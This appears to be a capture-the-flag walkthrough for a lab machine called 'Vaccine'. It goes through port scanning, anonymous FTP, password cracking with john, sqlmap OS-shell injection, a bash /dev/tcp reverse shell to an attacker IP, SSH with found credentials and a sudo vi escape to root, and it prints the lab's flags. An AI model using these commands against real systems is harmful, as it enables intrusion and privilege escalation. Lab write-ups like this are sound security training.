@@ -1,0 +1,110 @@
+First port scan using nmap:
+		nmap -Pn -p-  -T4 10.129.95.174 
+		## Results = 21,22,80
+Service scan on open port
+		nmap -p 21,22,80 -sV 10.129.95.174 -oA Vaccine 
+		
+		
+We have ftp service running, lets check anonymous
+		nmap -p 21 -sV 10.129.95.174 -A
+		#ftp-anon: Anonymous FTP login allowed (FTP code 230)
+  
+Anonymous is enabled!! lets connect
+
+	ftp 10.129.95.174   
+	password: anonymous
+	ftp> ls
+	#Output:	-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
+	ftp> get backup.zip
+
+we found backup.zip file
+but its blocked with a password
+lets try to crack it using zip2john
+	zip2john backup.zip  > > ziphash
+	john ziphash --wordlist=/usr/share/wordlists/rockyou.txt 
+	#Output:	741852963        (backup.zip)     
+
+lets extract the contnets of the zip:
+	7z x backup.zip 
+	ls
+	#Output: 	backup.zip  index.php  style.css  
+
+inside index.php we found this line:
+	if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
+the user admin and password is incoded with md5 hash
+lets crack the password using john -->
+	
+	john passhash --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt
+	#Output: 	qwerty789        (?)     
+
+now we have valid credentials, lets check the webserver running on port 80
+login with:
+user name : admin
+password: 	qwerty789
+we see basic table, and a search bar
+lets use sqlmap to test for sql injection
+
+sqlmap -u "http://10.129.95.174/dashboard.php?search=1" \
+       --cookie="PHPSESSID=hcglb7dvpvmdb3nqh782t6uu44;" \
+       --batch -v 3 --os-shell
+
+	* -u -> url, sqlmap will test the ?search= for sql injection
+	* --cookie= -> the website reqiers authentication , will have to suplly valid cookie so it will manage to connect
+	* --batch -> dont promt the user for question, answer automaticaly and continue
+	* -v 3 -> verbose level, 1 is minimal, 3 show info about what sqlmap is doing
+	* --os-shell -> try to get valid command executation on the os of the website using sql injection
+	
+It worked!!!, we can ran a command
+lets try to get a reverse shell using bash in order to get more steady shell
+IN out attacker machine (kali),create a listener
+	nc -lvnp 43211
+In the os-shell : create a reverse shell to the same port-->
+	bash -c "bash -i >& /dev/tcp/10.10.16.13/43211 0>&1"
+
+
+We have a SHELL!!!
+Lets recon the terminal and check intresting files
+we are user postgres, lets check its home dir
+we found the FLAG in user.txt!!!
+	user flag --> 'ec9b13ca4d6229cd5cc1e09980965bf7'
+lets check another files
+	cd /var/www/html
+	cat dashboard.php | grep postgres
+	#user=postgres password=P@s5w0rd!");
+
+We found the password for user postgres
+lets connect using ssh -->
+
+	ssh postgres@10.129.95.174
+	password: P@s5w0rd!
+
+We ARE IN!
+lets run sudo -l to check what commands can postgres run as sudo
+
+	postgres@vaccine:~$ sudo -l
+
+	User postgres may run the following commands on vaccine:
+		(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+Amaizing, vi is program like nano that lets you create files
+there is basic privilege esculation technick the lets us gain root user with vim
+
+we see that we have vi only for the 'pg_hba.conf' file
+lets use it
+
+	sudo vi /etc/postgresql/11/main/pg_hba.conf
+	:!bash
+
+lets check who we are?
+LEts go!! we are ROOT
+
+	root@vaccine:/var/lib/postgresql# cd /root
+	root@vaccine:~# ls
+	pg_hba.conf  root.txt  snap
+	root@vaccine:~# cat root
+	cat: root: No such file or directory
+	root@vaccine:~# cat root.txt
+	dd6e058e814260bc70e9bbdef2715849
+we found the FLAG in root.txt!!!
+	user flag --> 'dd6e058e814260bc70e9bbdef2715849'
+
